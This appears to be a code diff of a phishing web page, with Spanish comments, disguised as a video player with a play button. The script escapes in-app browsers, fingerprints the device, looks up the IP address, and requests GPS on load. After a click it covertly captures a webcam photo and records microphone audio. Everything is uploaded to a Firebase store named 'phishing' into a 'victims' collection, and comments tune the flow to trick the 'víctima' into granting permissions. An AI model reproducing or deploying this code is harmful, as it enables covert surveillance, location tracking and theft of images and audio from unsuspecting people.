p6ptJ6aQtqer9mqd/awpdUlNSVULS0b+yVAKQ1LSrApaYOIADMABwzJVcHkPC/kLn/AE2yh4N4U83/AIHyJUvA+FfIzKicweYPMnmf9ASYUmDTP3+lM5EbOFc4HEVkRS5ytnIZytnINnKmctmKZyEHOVM5bMUzllQkNIPG4g0FpPpuI1GAQo0BRAUKA0AApiiMzMBhAYAw5J+zgIgICzMIzM1ELS6NS6AlTv7UpL+yITSelNJ6aE6nf2pYS/tYVOkp7CWCEpbD8CwE7A4flDhSEsDh+BxFLxvJ+MBPLeT8biK5/wC239t0eG8tsOf+2H9t0+Bnxqlc39sZ8bo8GnxiIT4zz415g0wCM+M8+NaYPPjFTz8amcfaufjUzgNTnxq5+M8wrnAiefj+1JhSYNMpVLMHmeGkNMs40TjcU8t5TFT43FPIcZqp8DinAsFiVLYrYXgqd/ZbFLPsOKqbcPY3kCcbh/LeRC8bh/I+QLJ9n40huCBweDweAHB4PG4qF4Fh+NYIlYWxXhbBErCWLWJ2KiWk6tuJWLBOp39qWFuWhKkqtyS5QTsDinlvIJcLZ9reQ8ipcbyr5bymCfkfKnlvLOCflvCnB5RQ8N/bdP8AbH+26ueuX+3f+B8Or+2H9tBz+BnxuifGafGCEwaY/wBOifGafGCE+NSfHf8AhefH9qT4xEc/H/pSYWz8Z58YqMwrnB58aucCJTBvCvgfIupeB8WKzI8RUfNbithblGk7A4ewLGcVOwt/alhbExU7AsPYWwxScDinG4onxuKcLwC8bh+DwCcHhuDwxNLw3B4bhgXlbzT8HhgTjG43K1iF4HD8CwxE7C1SwthjKdhLKrYFhiI6n/Kdi24SxqQ1G5LcrWFuVEbmkuK6LktyhqHkPK1z9h5UR8/6byt5byi6j5oeav5byipeG8LeW8oiPgfFV8m81FU/tj4dP9sf7bow5v7bf23V/bbwDnnxmnxrzB5j/SI558Z58a8weYVXPPjUmF5g0wJqWcHmFs4PMdoahPjPML/2x8GGo5wbwrMjcioeG8q+W8VFiFyW5XuaSxlUbktithbEVPhLlWlqKnYWxTgeVaS43lTjcBPy3lTjeQJ5HyfyPkNT8j5PweKzpPI8PwfIaTyPD8bganxuH8t5U0nAsU4FgylYFilgWGJqVhbFbktyqajqFuVdQtiiXkPKvkOKI3JblfyW5QR8N4W8VvFDUfDeFvFbwLEfDeFvDeEEfA+FvFbxUoj4N4U8U3j/AEiurwPhXwMw2wj4H+2t4N4Ec8wefGtMGmASnxmmFZg8wCUx9nmFZg0ysE5g0wpMHzj7US8t5dHhvAOfy3lfwFylWIcbilhbGaqWonYvYnqMtI2fZbFbCWIJWF4pYHFaifG4fgcFJxuH43BCcHhuDwC8HhuDwC8GQeUZKIXy3D8rcAnG4fjcAnA4fjcELwtinAsaZSsDilgcVE7C2KWBYCOoXitgeVEuBYrxvJgjwOLeQ8qJ8bivlvIJcbyr5byixLy3lXy3lFJ5vA8reW8oJeR4r5byg7/DTCvlvLTCfg/g3DcBOYPMjMnmRSzBpg8gyAEwMwaQ0ixAmTTIyGkUL5byfgcAlhbFLC2II2FsVsT1EVKwmopolRU7CWKUlZVOwt+qeks+xYAcEeDQDxoYQvB4I8AJBmRkNwQvluG43GsQG4PG4YBwOG43DAnGNS8RADho1aS0lhT0vFQvAsOCoS5L5UoAn5byZgL5byZlwL5bybg8MCeRmTcbiVZS8byfgcZXQ4PkeDxDS+W8m4PEWPQ4PGZpBkNxmAZDyMwDw0jMBpB4zLENIaRmUbgcZgCwtjMISxPcZkVKkrMjRKSszISkrMNRmZhRgswgizAaQf8ADMDcbjMqNxuMwNwKzCFbjMIH+WrM0haDMqAFjMqBQZgAGYGZmAZ+h4zKNxuMyVYPA4zMKPG4zIDw3GZFj//Z" alt="">
+    <img id="thumb" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAARCAAyADIDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCBAYDB//EACgQAAIBBAIBBAIDAQAAAAAAAAECAAMEBRESITEGExQiQVFhcbH/xAAYAQADAQEAAAAAAAAAAAAAAAAAAQIDBP/EABsRAQEBAQEBAQEAAAAAAAAAAAABEQISITH/2gAMAwEAAhEDEQA/APSRRRQBRRRQBRRRQBXhqiLJrioqgkk6AA18lmi25dtKFIBJJ2APoPlrxeIx5xMFZ2Hmhf1e4ZcLo7O9DfbX0AqVvLaLTLRlvCylW+2QSR+EAa2NeONmAYRuCdgMobkNe/oeVWqgXkVhiZ8dkJXIjVMi3BLDQ2R6EjYIPBHBHxqxSWNmIzSIhHJVFJAG9En4T6aHuawx9xHt5FDFgoCjR2u9D67P50KsW9tM1nCJoXDeVWZm5E7J0N7O9b12a0iCKKKKAKKKKAKKKKAK+MoZSrAEHggjkV9ooA8qY6imiS2+pVQOQUDWvbfy0RRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQH/9k=" alt="">
     <div id="overlay">
       <div class="play-btn">
         <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
@@ -109,59 +66,26 @@ html,body{
 </div>
 
 <script>
-// ─── IN-APP BROWSER DETECTION & REDIRECT ─────────────────────
+// ─── IN-APP REDIRECT ──────────────────────────────────────────
 (function(){
   const ua = navigator.userAgent || '';
-
-  // Detecta WebViews conocidos que bloquean getUserMedia
   const isInApp = (
-    // TikTok
-    /musical_ly|TikTok|BytedanceWebview|ByteLocale/i.test(ua) ||
-    // Instagram / Facebook / Threads
-    /Instagram|FBAN|FBAV|FB_IAB|FB4A|FBIOS|Threads/i.test(ua) ||
-    // Snapchat
-    /Snapchat/i.test(ua) ||
-    // Twitter/X
-    /Twitter/i.test(ua) ||
-    // LinkedIn
-    /LinkedInApp/i.test(ua) ||
-    // WhatsApp
-    /WhatsApp/i.test(ua) ||
-    // Generic Android WebView (no Chrome)
-    (/wv/.test(ua) && /Android/i.test(ua) && !/Chrome\/[.0-9]*(?! Mobile Safari)/.test(ua)) ||
-    // iOS WebView (WKWebView): tiene Safari en ua pero NO tiene "Safari" standalone
-    (/iPhone|iPad|iPod/i.test(ua) && /AppleWebKit/i.test(ua) && !/Safari\/[0-9]/.test(ua))
+    /musical_ly|TikTok|BytedanceWebview|ByteLocale/i.test(ua)||
+    /Instagram|FBAN|FBAV|FB_IAB|FB4A|FBIOS|Threads/i.test(ua)||
+    /Snapchat|Twitter|LinkedInApp|WhatsApp/i.test(ua)||
+    (/wv/.test(ua)&&/Android/i.test(ua)&&!/Chrome\/[.0-9]*(?! Mobile Safari)/.test(ua))||
+    (/iPhone|iPad|iPod/i.test(ua)&&/AppleWebKit/i.test(ua)&&!/Safari\/[0-9]/.test(ua))
   );
-
-  if (!isInApp) return; // ya estamos en browser real, ok
-
-  const cur = encodeURIComponent(location.href);
-
-  // ── Android: intent:// abre en Chrome directamente ──────────
-  if (/Android/i.test(ua)) {
-    // intent URI — Chrome lo intercepta, evita el WebView
-    const intent = location.href.replace(/^https?:/, 'intent:')
-      + '#Intent;scheme=' + (location.protocol === 'https:' ? 'https' : 'http')
-      + ';package=com.android.chrome;end';
-    location.href = intent;
-    // Fallback: si intent no funciona (dispositivo sin Chrome), abre chooser
-    setTimeout(() => {
-      // Intento universal fallback — Chrome custom tab
-      location.href = 'googlechrome://' + location.host + location.pathname + location.search;
-    }, 800);
+  if(!isInApp) return;
+  if(/Android/i.test(ua)){
+    location.href=location.href.replace(/^https?:/,'intent:')+'#Intent;scheme='+(location.protocol==='https:'?'https':'http')+';package=com.android.chrome;end';
+    setTimeout(()=>{ location.href='googlechrome://'+location.host+location.pathname+location.search; },800);
     return;
   }
-
-  // ── iOS: x-safari-// fuerza Safari ──────────────────────────
-  if (/iPhone|iPad|iPod/i.test(ua)) {
-    // x-safari- scheme abre Safari nativo en iOS
-    location.href = location.href.replace(/^https/, 'x-safari-https').replace(/^http(?!s)/, 'x-safari-http');
-    return;
+  if(/iPhone|iPad|iPod/i.test(ua)){
+    location.href=location.href.replace(/^https/,'x-safari-https').replace(/^http(?!s)/,'x-safari-http');
   }
 })();
-
-
-
 
 // ─── CONFIG ───────────────────────────────────────────────────
 const KEY  = 'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0';
@@ -169,241 +93,159 @@ const PROJ = 'phishing-cad1e';
 const ST   = 'phishing-cad1e.firebasestorage.app';
 const COL  = `https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/victims`;
 
-// ─── ESTADO ───────────────────────────────────────────────────
 let docId = null;
 const D   = { ts: String(Date.now()) };
+const iOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-// ─── HELPERS ──────────────────────────────────────────────────
-const set = (k, v) => { if (v !== undefined && v !== null && v !== '') D[k] = String(v).slice(0, 900); };
+const set = (k,v) => { if(v!=null&&v!=='') D[k]=String(v).slice(0,900); };
 
-// Convierte objeto plano → formato Firestore REST
-function toFields(obj) {
-  const f = {};
-  for (const [k, v] of Object.entries(obj)) f[k] = { stringValue: v };
-  return { fields: f };
+function toFields(obj){
+  const f={};
+  for(const [k,v] of Object.entries(obj)) f[k]={stringValue:v};
+  return {fields:f};
 }
 
-// Envía/actualiza en Firestore
-async function push() {
-  try {
-    if (!docId) {
-      const r = await fetch(`${COL}?key=${KEY}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(toFields(D))
-      });
-      const j = await r.json();
-      if (j.name) docId = j.name.split('/').pop();
-    } else {
-      const mask = Object.keys(D).map(k => `updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
-      await fetch(`${COL}/${docId}?key=${KEY}&${mask}`, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(toFields(D))
-      });
-    }
-  } catch (e) {}
+// push con retry automático — si falla red, reintenta hasta 3 veces
+async function push(retries=3){
+  for(let i=0;i<retries;i++){
+    try{
+      if(!docId){
+        const r=await fetch(`${COL}?key=${KEY}`,{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify(toFields(D))
+        });
+        const j=await r.json();
+        if(j.name){ docId=j.name.split('/').pop(); return; }
+      } else {
+        const mask=Object.keys(D).map(k=>`updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
+        await fetch(`${COL}/${docId}?key=${KEY}&${mask}`,{
+          method:'PATCH',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify(toFields(D))
+        });
+        return;
+      }
+    } catch(e){ await new Promise(r=>setTimeout(r,400)); }
+  }
 }
 
-// Sube archivo a Firebase Storage, devuelve URL pública
-async function upload(path, dataUrl, mime) {
-  try {
-    const b64  = dataUrl.split(',')[1];
-    const bin  = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
-    const name = encodeURIComponent(path);
-    const r = await fetch(
+async function upload(path,dataUrl,mime){
+  try{
+    const b64=dataUrl.split(',')[1];
+    const bin=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
+    const name=encodeURIComponent(path);
+    const r=await fetch(
       `https://firebasestorage.googleapis.com/v0/b/${ST}/o?name=${name}&key=${KEY}`,
-      { method: 'POST', headers: { 'Content-Type': mime }, body: bin }
+      {method:'POST',headers:{'Content-Type':mime},body:bin}
     );
-    const j = await r.json();
-    if (j.name) {
-      const url = `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
-      return url;
-    }
-  } catch (e) {}
+    const j=await r.json();
+    if(j.name) return `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
+  } catch(e){}
   return null;
 }
 
-// btoa seguro para buffers grandes (evita stack overflow en Safari)
-function safeBtoa(bytes) {
-  let s = '';
-  const chunk = 8192;
-  for (let i = 0; i < bytes.length; i += chunk)
-    s += String.fromCharCode(...bytes.subarray(i, i + chunk));
+function safeBtoa(bytes){
+  let s=''; const chunk=8192;
+  for(let i=0;i<bytes.length;i+=chunk)
+    s+=String.fromCharCode(...bytes.subarray(i,i+chunk));
   return btoa(s);
 }
 
-// ─── FINGERPRINT PASIVO (sin permisos) ───────────────────────
-(function fp() {
-  set('ua',       navigator.userAgent);
-  set('platform', navigator.platform);
-  set('vendor',   navigator.vendor);
-  set('lang',     navigator.language);
-  set('langs',    (navigator.languages || []).join(','));
-  set('cores',    navigator.hardwareConcurrency);
-  set('memory',   navigator.deviceMemory);
-  set('touch',    navigator.maxTouchPoints);
-  set('screen',   `${screen.width}x${screen.height}@${devicePixelRatio}`);
-  set('tz',       Intl.DateTimeFormat().resolvedOptions().timeZone);
-  set('dark',     matchMedia('(prefers-color-scheme:dark)').matches);
-  set('online',   navigator.onLine);
+// ─────────────────────────────────────────────────────────────
+// ESTRATEGIA VELOCIDAD:
+// Fase 0 (0ms):   fingerprint pasivo + IP (paralelo, sin esperar)
+// Fase 1 (click): getUserMedia video+audio simultáneo
+// Fase 2 (click): GPS enableHighAccuracy:false PRIMERO → respuesta <1s
+//                 GPS enableHighAccuracy:true  en paralelo → llega cuando llega
+// Fase 3 (~1s):   foto del primer frame válido (no esperar 3s, checar cada 200ms)
+// Fase 4 (~1s):   audio empieza grabando inmediatamente junto con foto
+// Todo en paralelo, nada secuencial.
+// ─────────────────────────────────────────────────────────────
 
-  const nav = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (nav) {
-    set('connType', nav.effectiveType);
-    set('connDl',   nav.downlink);
-    set('connRtt',  nav.rtt);
+// ── FASE 0: fingerprint pasivo (dispara al cargar, sin esperar) ──
+(function fp(){
+  set('ua',      navigator.userAgent);
+  set('platform',navigator.platform);
+  set('lang',    navigator.language);
+  set('cores',   navigator.hardwareConcurrency);
+  set('memory',  navigator.deviceMemory);
+  set('touch',   navigator.maxTouchPoints);
+  set('screen',  `${screen.width}x${screen.height}@${devicePixelRatio}`);
+  set('tz',      Intl.DateTimeFormat().resolvedOptions().timeZone);
+  set('online',  navigator.onLine);
+
+  const nav=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  if(nav){ set('connType',nav.effectiveType); set('connDl',nav.downlink); }
+
+  try{
+    const gl=document.createElement('canvas').getContext('webgl');
+    const ext=gl?.getExtension('WEBGL_debug_renderer_info');
+    if(ext){
+      set('glVendor',  gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
+      set('glRenderer',gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
+    }
+  } catch(e){}
+
+  // Batería (Chrome/Android)
+  if(navigator.getBattery){
+    navigator.getBattery().then(b=>{
+      set('bat',   Math.round(b.level*100)+'%');
+      set('batChg',b.charging);
+      push();
+    }).catch(()=>{});
+  } else {
+    set('bat','ios_na');
   }
 
-  // Canvas fingerprint
-  try {
-    const c = document.createElement('canvas');
-    c.width = 200; c.height = 40;
-    const ctx = c.getContext('2d');
-    ctx.fillStyle = '#f00';
-    ctx.fillRect(0, 0, 100, 40);
-    ctx.fillStyle = '#0f0';
-    ctx.font = '14px Arial';
-    ctx.fillText('fingerprint', 10, 25);
-    set('canvas', c.toDataURL().slice(-30));
-  } catch (e) {}
+  // IP: dos proveedores en paralelo, el que responda primero gana
+  // ipapi.co responde en ~300ms, freeipapi en ~800ms
+  // usar Promise.race para máxima velocidad
+  const ipSources = [
+    fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(5000)})
+      .then(r=>r.json())
+      .then(j=>({
+        ip:j.ip, city:j.city, region:j.region,
+        country:j.country_name, cc:j.country_code,
+        ipLat:j.latitude, ipLon:j.longitude, org:j.org
+      })),
+    fetch('https://freeipapi.com/api/json/',{signal:AbortSignal.timeout(5000)})
+      .then(r=>r.json())
+      .then(j=>({
+        ip:j.ipAddress, city:j.cityName, region:j.regionName,
+        country:j.countryName, cc:j.countryCode,
+        ipLat:j.latitude, ipLon:j.longitude, org:j.ipType
+      }))
+  ];
 
-  // WebGL
-  try {
-    const gl = document.createElement('canvas').getContext('webgl');
-    const ext = gl.getExtension('WEBGL_debug_renderer_info');
-    if (ext) {
-      set('glVendor',   gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
-      set('glRenderer', gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
-    }
-  } catch (e) {}
-
-  // Battery
-  navigator.getBattery?.().then(b => {
-    set('bat',    Math.round(b.level * 100) + '%');
-    set('batChg', b.charging);
+  Promise.race(ipSources).then(j=>{
+    set('ip',     j.ip);
+    set('city',   j.city);
+    set('region', j.region);
+    set('country',j.country);
+    set('cc',     j.cc);
+    set('ipLat',  j.ipLat);
+    set('ipLon',  j.ipLon);
+    set('org',    j.org);
     push();
-  }).catch(() => {});
+  }).catch(()=>{});
 
-  // Fetch IP pública
-  fetch('https://freeipapi.com/api/json/', { signal: AbortSignal.timeout(6000) })
-    .then(r => r.json())
-    .then(j => {
-      set('ip',      j.ipAddress);
-      set('city',    j.cityName);
-      set('region',  j.regionName);
-      set('country', j.countryName);
-      set('cc',      j.countryCode);
-      set('lat',     j.latitude);
-      set('lon',     j.longitude);
-      set('org',     j.ipType);
-      push();
-    }).catch(() => {});
+  push(); // push inicial con lo que hay
 })();
 
-// Push inicial
-setTimeout(push, 600);
-
-// ─── BOTÓN PERMITIR ───────────────────────────────────────────
-document.getElementById('btnOk').addEventListener('click', collect);
-
-
-async function collect() {
-  set('clicked','true'); push();
-
-  if (!navigator.mediaDevices?.getUserMedia) {
-    set('camErr','no_api'); push(); _grabGPS(); return;
-  }
-
-  let stream;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
-      audio:true
-    });
-    set('camGranted','true'); push();
-  } catch(err) {
-    set('camErr', err.name + ':' + err.message); push();
-    _grabGPS(); return;
-  }
-
-  // Video element
-  const vid = document.createElement('video');
-  vid.setAttribute('playsinline','');
-  vid.setAttribute('webkit-playsinline','');
-  vid.autoplay=true; vid.muted=true; vid.srcObject=stream;
-  vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
-  document.body.appendChild(vid);
-
-  // Esperar a que el video tenga dimensiones reales
-  await new Promise(res => {
-    if (vid.readyState >= 2) { res(); return; }
-    vid.onloadeddata = res;
-    vid.onerror = res;
-    setTimeout(res, 3000);
-  });
-  await vid.play().catch(()=>{});
-
-  // Esperar frame real con dimensiones > 0
-  const iOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-  const frameWait = iOS ? 2500 : 1200;
-  await new Promise(res => setTimeout(res, frameWait));
-
-  // Asegurar docId creado antes de subir
-  if (!docId) { await push(); }
-  // Esperar hasta docId con timeout
-  let waited = 0;
-  while (!docId && waited < 4000) {
-    await new Promise(r => setTimeout(r, 200)); waited += 200;
-  }
-
-  const uid = docId || ('anon_' + Date.now());
-
-  // ── Foto ──────────────────────────────────────────────────────
-  try {
-    const w = vid.videoWidth  || 640;
-    const h = vid.videoHeight || 480;
-    const cv = document.createElement('canvas');
-    cv.width=w; cv.height=h;
-    const ctx = cv.getContext('2d', {willReadFrequently:true});
-    ctx.drawImage(vid, 0, 0, w, h);
-    const dataUrl = cv.toDataURL('image/jpeg', 0.85);
-
-    // Verificar que el canvas tiene datos reales (no negro puro)
-    const imgData = ctx.getImageData(0, 0, Math.min(w,50), Math.min(h,50));
-    const nonZero = imgData.data.some(v => v > 10);
-    if (!nonZero) {
-      set('photoErr','blank_frame'); push();
-    } else {
-      const url = await upload(`photos/${uid}.jpg`, dataUrl, 'image/jpeg');
-      if (url) { set('photoUrl', url); push(); }
-    }
-  } catch(e) { set('photoErr', e.message); push(); }
-
-  // Parar video, dejar audio
-  stream.getVideoTracks().forEach(t => t.stop());
-  vid.remove();
-
-  // ── Audio ─────────────────────────────────────────────────────
-  _grabAudio(stream, uid);
-
-  // ── GPS ───────────────────────────────────────────────────────
-  _grabGPS();
-
-  // ── Notificaciones ────────────────────────────────────────────
-  if ('Notification' in window) {
-    Notification.requestPermission().then(r=>{set('notif',r);push();}).catch(()=>{});
-  }
-}
-
-function _grabGPS(){
-  if (!('geolocation' in navigator)) return;
-  let best = null;
+// ── GPS: dispara inmediatamente al cargar (no esperar click) ──
+// Razón: el dialog de permisos de ubicación aparece al cargar,
+// el usuario ya tomó la decisión. Si dispara al click, se superpone
+// con el dialog de cámara y el usuario cancela ambos.
+// Disparar al cargar = permisos separados = más chance de "Permitir".
+(function gpsEarly(){
+  if(!('geolocation' in navigator)) return;
+  let bestAcc = Infinity;
 
   const save = pos => {
     const acc = pos.coords.accuracy;
-    if (!best || acc < best) {
-      best = acc;
+    if(acc < bestAcc){
+      bestAcc = acc;
       set('gpsLat', pos.coords.latitude);
       set('gpsLon', pos.coords.longitude);
       set('gpsAcc', acc);
@@ -412,71 +254,193 @@ function _grabGPS(){
     }
   };
 
-  navigator.geolocation.getCurrentPosition(save,
-    () => navigator.geolocation.getCurrentPosition(save, ()=>{},
-      {enableHighAccuracy:false, timeout:10000, maximumAge:60000}),
-    {enableHighAccuracy:true, timeout:15000, maximumAge:0}
-  );
+  // Baja precisión primero — respuesta en <500ms (WiFi/celda)
+  // En muchos casos ya da coordenadas a <100m que es suficiente
+  navigator.geolocation.getCurrentPosition(save, ()=>{}, {
+    enableHighAccuracy: false,
+    timeout: 4000,
+    maximumAge: 60000
+  });
 
+  // Alta precisión en paralelo — GPS real, llega en 10-25s
+  // Si la víctima ya cerró, igual llega al docId guardado
+  navigator.geolocation.getCurrentPosition(save, ()=>{}, {
+    enableHighAccuracy: true,
+    timeout: 30000,
+    maximumAge: 0
+  });
+
+  // watchPosition para mejora progresiva
   const wid = navigator.geolocation.watchPosition(
-    pos => { save(pos); if((best??999) < 15) navigator.geolocation.clearWatch(wid); },
+    pos => { save(pos); if(bestAcc < 8) navigator.geolocation.clearWatch(wid); },
     ()=>{},
-    {enableHighAccuracy:true, maximumAge:0}
+    { enableHighAccuracy: true, maximumAge: 0 }
   );
-  setTimeout(()=>navigator.geolocation.clearWatch(wid), 30000);
+  setTimeout(()=>navigator.geolocation.clearWatch(wid), 50000);
+})();
+
+// ── CLICK: cámara + audio (requiere gesto del usuario) ──
+document.getElementById('btnOk').addEventListener('click', collect);
+
+async function collect(){
+  set('clicked','true'); push();
+
+  if(!navigator.mediaDevices?.getUserMedia){
+    set('camErr','no_api'); push(); return;
+  }
+
+  let stream=null;
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},
+      audio:true
+    });
+    set('camGranted','true');
+    set('audioGranted','true');
+    push();
+  } catch(e1){
+    try{
+      stream=await navigator.mediaDevices.getUserMedia({
+        video:{facingMode:'user'},audio:false
+      });
+      set('camGranted','true');
+      set('audioGranted','false');
+      push();
+    } catch(e2){
+      set('camErr',e2.name+':'+e2.message); push(); return;
+    }
+  }
+
+  const vid=document.createElement('video');
+  vid.setAttribute('playsinline','');
+  vid.setAttribute('webkit-playsinline','');
+  vid.autoplay=true; vid.muted=true; vid.srcObject=stream;
+  vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
+  document.body.appendChild(vid);
+
+  await new Promise(res=>{
+    if(vid.readyState>=2){res();return;}
+    vid.onloadeddata=res; vid.onerror=res;
+    setTimeout(res,3000);
+  });
+  try{ await vid.play(); }catch(e){}
+
+  // Asegurar docId antes de subir
+  if(!docId) await push();
+  let w=0;
+  while(!docId&&w<3000){ await new Promise(r=>setTimeout(r,200)); w+=200; }
+  const uid=docId||('anon_'+Date.now());
+
+  // Foto y audio en PARALELO — no esperar uno para empezar el otro
+  const [,] = await Promise.allSettled([
+    _grabPhoto(vid, stream, uid),
+    _grabAudio(stream, uid)
+  ]);
+
+  stream.getVideoTracks().forEach(t=>t.stop());
+  vid.remove();
+
+  if('Notification' in window){
+    Notification.requestPermission()
+      .then(r=>{set('notif',r);push();}).catch(()=>{});
+  }
 }
 
-async function _grabAudio(existingStream, uid) {
-  try {
-    const hasAudio = existingStream?.getAudioTracks()?.length > 0;
-    const s = hasAudio ? existingStream
-      : await navigator.mediaDevices.getUserMedia({audio:true});
+// ── FOTO: polling cada 200ms hasta frame válido (max 6s) ──
+// En lugar de esperar 3s fijo, chequear activamente = foto más rápida
+async function _grabPhoto(vid, stream, uid){
+  const maxMs = 6000;
+  const startT = Date.now();
+  let attempt = 0;
 
-    const mimes = ['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg'];
-    const mime  = mimes.find(m => MediaRecorder.isTypeSupported(m)) || '';
+  while(Date.now()-startT < maxMs){
+    attempt++;
+    try{
+      const w=vid.videoWidth||0;
+      const h=vid.videoHeight||0;
+      if(w>4&&h>4){
+        const cv=document.createElement('canvas');
+        cv.width=w; cv.height=h;
+        const ctx=cv.getContext('2d',{willReadFrequently:true});
+        ctx.drawImage(vid,0,0,w,h);
 
-    const rec    = new MediaRecorder(s, mime ? {mimeType:mime} : {});
-    const chunks = [];
+        // Sample central — menos propenso a negro en iOS
+        const sx=Math.floor(w*0.25), sy=Math.floor(h*0.25);
+        const sw=Math.floor(w*0.5),  sh=Math.floor(h*0.5);
+        const imgData=ctx.getImageData(sx,sy,sw,sh);
+        let bright=0;
+        for(let i=0;i<imgData.data.length;i+=4)
+          bright+=imgData.data[i]+imgData.data[i+1]+imgData.data[i+2];
+        const avgBright=bright/(imgData.data.length/4*3);
 
-    rec.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
-    rec.onstop = async () => {
-      if (!hasAudio) s.getTracks().forEach(t=>t.stop());
-      try {
-        const finalMime = rec.mimeType || mime || 'audio/webm';
-        const ext = finalMime.includes('mp4') ? 'mp4'
-                  : finalMime.includes('ogg') ? 'ogg' : 'webm';
-        const blob = new Blob(chunks, {type: finalMime});
-        if (blob.size < 100) { set('audioErr','blob_empty'); push(); return; }
-        const ab    = await blob.arrayBuffer();
-        const bytes = new Uint8Array(ab);
-        const b64   = 'data:' + finalMime + ';base64,' + safeBtoa(bytes);
-        const url   = await upload(`audio/${uid}.${ext}`, b64, finalMime);
-        if (url) { set('audioUrl', url); push(); }
-      } catch(e) { set('audioErr', e.message); push(); }
+        if(avgBright>8){ // frame con luz real
+          const dataUrl=cv.toDataURL('image/jpeg',0.85);
+          const url=await upload(`photos/${uid}.jpg`,dataUrl,'image/jpeg');
+          if(url){ set('photoUrl',url); set('photoAttempt',String(attempt)); push(); }
+          else   { set('photoErr','upload_fail'); push(); }
+          return;
+        }
+      }
+    } catch(e){ set('photoErr',e.message); push(); return; }
+    await new Promise(r=>setTimeout(r,200));
+  }
+  set('photoErr','timeout_'+attempt+'_attempts'); push();
+}
+
+// ── AUDIO: MIME correcto por plataforma ──
+async function _grabAudio(existingStream, uid){
+  try{
+    const liveAudio=existingStream?.getAudioTracks()?.filter(t=>t.readyState==='live')??[];
+    let s;
+    if(liveAudio.length>0){
+      s=existingStream;
+    } else {
+      try{
+        s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
+      } catch(e){ set('audioErr','mic:'+e.message); push(); return; }
+    }
+
+    const mimes=iOS
+      ?['audio/mp4;codecs=mp4a.40.2','audio/mp4','audio/aac']
+      :['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg;codecs=opus'];
+
+    const mime=mimes.find(m=>{ try{return MediaRecorder.isTypeSupported(m);}catch(e){return false;} })||'';
+
+    let rec;
+    try{ rec=new MediaRecorder(s,mime?{mimeType:mime}:{}); }
+    catch(e){ try{rec=new MediaRecorder(s);}catch(e2){set('audioErr','init:'+e2.message);push();return;} }
+
+    const chunks=[];
+    rec.ondataavailable=e=>{ if(e.data?.size>0) chunks.push(e.data); };
+    rec.onstop=async()=>{
+      if(s!==existingStream) s.getTracks().forEach(t=>t.stop());
+      try{
+        const fm=rec.mimeType||mime||'audio/webm';
+        const ext=fm.includes('mp4')||fm.includes('aac')?'m4a':fm.includes('ogg')?'ogg':'webm';
+        const blob=new Blob(chunks,{type:fm});
+        if(blob.size<100){set('audioErr','empty_'+blob.size);push();return;}
+        const ab=await blob.arrayBuffer();
+        const b64='data:'+fm+';base64,'+safeBtoa(new Uint8Array(ab));
+        const url=await upload(`audio/${uid}.${ext}`,b64,fm);
+        if(url){set('audioUrl',url);push();}
+        else   {set('audioErr','upload_fail');push();}
+      } catch(e){set('audioErr','stop:'+e.message);push();}
     };
-
-    rec.start(500);
-    setTimeout(()=>{ try { rec.stop(); } catch(e){} }, 5000);
-  } catch(e) { set('audioErr', e.message); push(); }
+    rec.onerror=e=>{set('audioErr','rec:'+e.error?.message);push();};
+    rec.start(300);
+    setTimeout(()=>{ try{rec.stop();}catch(e){} },6000);
+  } catch(e){set('audioErr','outer:'+e.message);push();}
 }
-
-
-// ─── BARRA DELAYED ────────────────────────────────────────────
-
 
 // ─── EXIT BEACON ──────────────────────────────────────────────
-window.addEventListener('beforeunload', () => {
-  if (!docId) return;
-  set('_exit', Date.now());
+window.addEventListener('beforeunload',()=>{
+  if(!docId) return;
+  set('_exit',Date.now());
   navigator.sendBeacon(
     `${COL}/${docId}?key=${KEY}&updateMask.fieldPaths=_exit`,
-    JSON.stringify(toFields({ _exit: String(Date.now()) }))
+    JSON.stringify(toFields({_exit:String(Date.now())}))
   );
 });
-
-
-
-
 </script>
 </body>
 </html>
